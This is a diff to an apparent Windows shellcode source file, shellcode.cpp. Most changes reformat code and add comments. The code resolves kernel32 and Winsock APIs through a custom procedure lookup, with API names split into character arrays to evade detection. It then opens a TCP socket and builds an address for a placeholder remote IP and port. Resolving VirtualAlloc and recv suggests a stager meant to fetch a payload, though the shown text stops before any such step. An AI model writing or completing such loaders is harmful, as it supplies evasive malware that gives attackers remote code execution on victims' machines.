@@ -1,3 +1,5 @@
+// shellcode.cpp
+
 #include <windows.h>
 #include <winternl.h>
 
@@ -23,26 +25,29 @@ typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
 
 extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
     ULONG_PTR kernel32 = GetKernel32Base();
-    if (!kernel32) return;
+    if (!kernel32)
+        return;
 
     // Resolve Essential Kernel32 APIs
-    char strLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 };
-    char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
+    char strLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 }; // LoadLibraryA()
+    char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 }; // VirtualAlloc()
     
     fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(kernel32, strLoadLibrary);
     fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)CustomGetProcAddress(kernel32, strVirtualAlloc);
-    if (!pLoadLibraryA || !pVirtualAlloc) return;
+    if (!pLoadLibraryA || !pVirtualAlloc)
+        return;
 
     // Load Winsock
-    char strWs2[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
+    char strWs2[] = { 'w','s','2','_','3','2','.','d','l','l', 0 }; // ws2_32.dll
     HMODULE hWs2 = pLoadLibraryA(strWs2);
-    if (!hWs2) return;
+    if (!hWs2)
+        return;
 
     // Resolve Winsock APIs
-    char strWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p', 0 };
-    char strWSASocketA[] = { 'W','S','A','S','o','c','k','e','t','A', 0 };
-    char strConnect[] = { 'c','o','n','n','e','c','t', 0 };
-    char strRecv[] = { 'r','e','c','v', 0 };
+    char strWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p', 0 }; // WSAStartup()
+    char strWSASocketA[] = { 'W','S','A','S','o','c','k','e','t','A', 0 }; // WSASocketA()
+    char strConnect[] = { 'c','o','n','n','e','c','t', 0 }; // connect()
+    char strRecv[] = { 'r','e','c','v', 0 }; // recv()
 
     fnWSAStartup pWSAStartup = (fnWSAStartup)CustomGetProcAddress((ULONG_PTR)hWs2, strWSAStartup);
     fnWSASocketA pWSASocketA = (fnWSASocketA)CustomGetProcAddress((ULONG_PTR)hWs2, strWSASocketA);
@@ -51,11 +56,13 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
 
     // Initialize Winsock Stack
     char wsaData[400];
-    if (pWSAStartup(0x0202, &wsaData) != 0) return;
+    if (pWSAStartup(0x0202, &wsaData) != 0)
+        return;
 
     // Open Socket
     UINT_PTR s = pWSASocketA(2, 1, 6, NULL, 0, 0); // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6
-    if (s == (UINT_PTR)INVALID_HANDLE_VALUE) return;
+    if (s == (UINT_PTR)INVALID_HANDLE_VALUE)
+        return;
 
     // Endianness Swap Mechanics for sockaddr_in structure layout
     unsigned int ip = RAW_IP;
@@ -63,6 +70,7 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
     unsigned short port = RAW_PORT;
     unsigned short net_port = ((port & 0xFF00) >> 8) | ((port & 0x00FF) << 8);
 
+    // sockaddr struct
     sockaddr_in targetAddr;
     targetAddr.sin_family = 2; // AF_INET
     targetAddr.sin_port = net_port;
